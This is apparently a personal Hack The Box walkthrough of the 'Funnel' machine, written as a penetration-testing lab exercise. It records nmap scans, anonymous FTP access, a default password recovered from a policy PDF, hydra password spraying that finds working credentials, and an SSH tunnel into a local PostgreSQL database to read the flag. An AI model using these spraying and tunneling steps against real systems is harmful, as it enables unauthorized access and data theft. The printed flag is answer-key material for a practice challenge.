# Funnel

> 10.129.228.195

## Nmap
```
nmap 10.129.228.195
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-13 19:33 EDT
Nmap scan report for 10.129.228.195
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```
```
nmap -sS -sV -sC -O -p 21,22 -T4 10.129.228.195
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-13 19:35 EDT
Nmap scan report for 10.129.228.195
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds
```

## FTP Enumeration
```
nmap --script ftp-anon -p 21 10.129.228.195
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-13 19:37 EDT
Nmap scan report for 10.129.228.195
Host is up (0.040s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup

Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
```
## FTP Login
1. Logged in as `anonymous` (no password/null password)
2. Did a `pwd` and was in a root directory for ftp (not the actual root)
3. Did an `ls` and saw there was one subdir: `mail_backup`
4. `cd` into the subdir and an `ls` revealed two files that I downloaded:

```
ftp> ls
229 Entering Extended Passive Mode (|||6644|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
226 Directory send OK.

ftp> get password_policy.pdf
local: password_policy.pdf remote: password_policy.pdf
229 Entering Extended Passive Mode (|||38072|)
150 Opening BINARY mode data connection for password_policy.pdf (58899 bytes).
100% |**************************************************************************************************************| 58899      695.91 KiB/s    00:00 ETA
226 Transfer complete.
58899 bytes received in 00:00 (474.45 KiB/s)

ftp> get welcome_28112022
local: welcome_28112022 remote: welcome_28112022
229 Entering Extended Passive Mode (|||56481|)
150 Opening BINARY mode data connection for welcome_28112022 (713 bytes).
100% |**************************************************************************************************************|   713       13.87 MiB/s    00:00 ETA
226 Transfer complete.
713 bytes received in 00:00 (34.43 KiB/s)
```

## password_policy.pdf
- Doc says: "...the default password of “funnel123#!#” must be changed immediately."
- The `welcome` file is the same as the `password` file.

## Users
- Need for find a list of users on the target to try the password.
- Or... password spraying: "Password spraying is a type of brute force attack which involves a malicious actor attempting to use the same password on multiple accounts before moving on to try another one."

```
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p 'funnel123#!#' 10.129.228.195 ftp                                     
[21][ftp] host: 10.129.228.195   login: ftp   password: funnel123#!#
1 of 1 target successfully completed, 1 valid password found
```

- Logged in with that user and didn't get anywhere. Used a different username list.
- Ran `hydra` and it crashed the target. Had to reset and tweak the timing (`-t`) of `hydra`.

> reset: 10.129.34.254

```
hydra -L /usr/share/wordlists/rockyou.txt -p 'funnel123#!#' 10.129.34.254 ftp -I -t 3
[21][ftp] host: 10.129.34.254   login: christine   password: funnel123#!#
```

## SSH
- used the creds `christine:funnel123#!#` to login via ssh.
- I could login but that didn't get me anywhere

## Enumeration
> This is from the walkthrough doc
- From this point on, we have complete access as the christine user on the target machine, and can start enumerating it for potential files or services that we can explore further.
- A crucial command at this point in time is the `ss` command ([reference](../../04_Enumeration/enum_sockets.md)), which stands for `socket statistics`, and it can be used to check which ports are listening locally on a given machine.
```
ss -tln
# -l: Display only listening sockets.
# -t: Display TCP sockets.
# -n: Do not try to resolve service names.
```
- If there are ports listening on the system, they will be listed by `ss`.
- In our scenario, one of the results was: `127.0.0.1:5432`.

## PostgreSQL
- TCP port is open 5432 (do a better nmap scan!! The question to answer on HTB led me to this port; I didn't find it)
- That port is used by PostgreSQL and it only listens only on localhost so if you want to connect remotely, you have to use ssh...
- Since you can't access PostgreSQL from the local machine, you will have to create a tunnel with local port forwarding
- Ref: https://www.postgresql.org/docs/current/ssh-tunnels.html

### SSH Tunneling to PostgreSQL
- Following the reference link above, I did: 
```
ssh -L 63333:localhost:5432 christine@10.129.34.254
psql -h localhost -p 63333 --username=christine postgres

# Result: postgres prompt...

postgres=# 
postgres-# \?     # for help
postgres-# \l     # list all databases
                                                        List of databases                                                                                   
   Name    |   Owner   | Encoding | Locale Provider |  Collate   |   Ctype    | ICU Locale | ICU Rules |    Access privileges                               
-----------+-----------+----------+-----------------+------------+------------+------------+-----------+-------------------------                           
 christine | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           |                                                    
 postgres  | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           |                                                    
 secrets   | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           |                                                    
 template0 | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | =c/christine           +                           
           |           |          |                 |            |            |            |           | christine=CTc/christine                            
 template1 | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | =c/christine           +                           
           |           |          |                 |            |            |            |           | christine=CTc/christine                            
(5 rows)  

postgres-# \c secrets      # connect to database
psql (16.2 (Debian 16.2-1), server 15.1 (Debian 15.1-1.pgdg110+1))                                                                                          
You are now connected to database "secrets" as user "christine". 

secrets-# \dt               # list all database tables
 public | flag | table | christine

secrets=# SELECT * FROM flag;
 cf277664b1771217d7006acdea006db1

```

![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/f3392c77-027b-497e-abd6-4b6218651a92)

